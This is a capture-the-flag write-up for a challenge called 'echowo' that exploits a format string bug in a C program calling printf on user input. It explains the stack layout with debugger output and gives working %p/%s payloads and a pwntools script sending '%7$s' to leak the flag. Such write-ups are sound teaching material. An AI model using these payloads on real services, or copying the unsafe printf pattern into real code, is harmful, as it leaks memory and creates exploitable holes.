# echowo

## Challenge

We are greeted with a prompt asking for our name.

The server will respond with a "Hello" message including the name we enter.

```
What's your name?
Green-Avocado
Hello Green-Avocado
```

The `vuln` function handles our input and sends the response.
It also has a pointer to the flag stored on the stack.

```c
void vuln() {
    char* flag = malloc(FLAG_LEN);
    get_flag(flag);

    char name[64];

    puts("What's your name?");
    fgets(name, sizeof name / sizeof name[0], stdin);

    printf("Hello ");
    printf(name);
}
```

## Solution

Notice that the `vuln` function uses `printf` to repeat our name in an unusal way.

```c
printf("Hello ");
printf(name);
```

Normally, the first argument of `printf` is a format string literal.
In this case, however, the first argument is our input.

If we look at the man page for `printf`, we find this warning:

> ### Bugs
>
> Code such as printf(foo); often indicates a bug, since foo may
> contain a % character.  If foo comes from untrusted user input,
> it may contain %n, causing the printf() call to write to memory
> and creating a security hole.

Since we have control over the `name` variable, we can pass our own format strings!

Normally, when `printf` encounters a format specifier such as `%d`,
it would look at the next arguments to determine what to print.
What happens when the format string is the only argument?

The calling convention specifies that the first 6 arguments are passed in registers
RDI, RSI, RDX, RCX, R8, and R9.
Any arguments after these are pushed on the stack before the function is called.

The first argument is taken by the pointer to the format string.
The next 5 will be read from the remaining registers.

For example, if we enter something like `%p %p %p %p %p`, the server responds like:

```
Hello 0x7568eb18ab70 (nil) 0x61f7d9a36907 0x7568eb18cca0 (nil)
```

But the numbers in these registers aren't particularly useful to us.

What about values on the stack?
`printf` expects that if we ask for any more values, they will have been pushed onto the stack.
However, this is not the case.
Instead, `printf` will read at the offset it expects the next arguments to be located at.
The first one, at RBP-0x8, is actually the top of the `vuln` call stack!

Using this, we can read any value in the `vuln` call stack, or even the `main` stack.
We know there is a pointer to the string on top of the stack,
so let's write 5 `%p` specifiers to skip the stack values, followed by a `%s` to read the string.

```
What's your name?
%p %p %p %p %p %s
Hello 0x75874ce94ff0 (nil) 0x65ec0a555907 0x75874ce97120 (nil) (null)
```

At the end of the response, we got a `(null)` where we expected to get the flag.
The reason becomes obvious if we look at what's happening in a debugger.

First we need to create a fake flag file to run the binary locally.
Then, if we step into the `vuln` function and print the stack, we get something like this:

```
00:0000│ rsp    0x7fffffffe0b0 ◂— 0x0
01:0008│        0x7fffffffe0b8 —▸ 0x1000052a0 ◂— 'fakeflag{for_testing_only}\n'
02:0010│ rax r8 0x7fffffffe0c0 ◂— 0xa61 /* 'a\n' */
03:0018│        0x7fffffffe0c8 ◂— 0x0
04:0020│        0x7fffffffe0d0 —▸ 0x7ffff7f9e300 (__GI__IO_file_jumps) ◂— 0x0
05:0028│        0x7fffffffe0d8 —▸ 0x7ffff7e5bc3d (__GI__IO_file_setbuf+13) ◂— test   rax, rax
06:0030│        0x7fffffffe0e0 —▸ 0x7ffff7f9c800 (_IO_2_1_stdin_) ◂— 0xfbad208b
07:0038│        0x7fffffffe0e8 —▸ 0x7ffff7e53129 (setbuffer+201) ◂— test   dword ptr [rbx], 0x8000
08:0040│        0x7fffffffe0f0 ◂— 0x0
09:0048│        0x7fffffffe0f8 —▸ 0x100001390 (__libc_csu_init) ◂— endbr64 
0a:0050│        0x7fffffffe100 —▸ 0x7fffffffe120 ◂— 0x0
0b:0058│        0x7fffffffe108 ◂— 0xf6f21762d5ee6800
0c:0060│ rbp    0x7fffffffe110 —▸ 0x7fffffffe120 ◂— 0x0
```

Notice that RSP is pointing above the flag, at an address set to 0x0.
This is because of stack alignment.
In `vuln`, there is a char array of size 64 and a pointer of size 8,
giving us a stack size of 72, which is not aligned to 16 bytes.
To ensure function calls are always aligned to 16 bytes, our stack is padded by 8 bytes.
This places our flag pointer at RBP-0x10 during the `printf` call.

Now that we know why the previous attempt failed, let's add one more `%p`
to skip the padding:

```
What's your name?
%p %p %p %p %p %p %s
Hello 0x7aa01b65ef90 (nil) 0x6ff769b2a907 0x7aa01b6610c0 (nil) (nil) maple{fowmat_stwing_vuwnewabiwity!!}
```

Now we can successfully read the flag!

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1340 echowo
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('echowo')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1340)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(b"What's your name?\n", b"%7$s")

io.interactive()
```

## Flag

```
maple{fowmat_stwing_vuwnewabiwity!!}
```
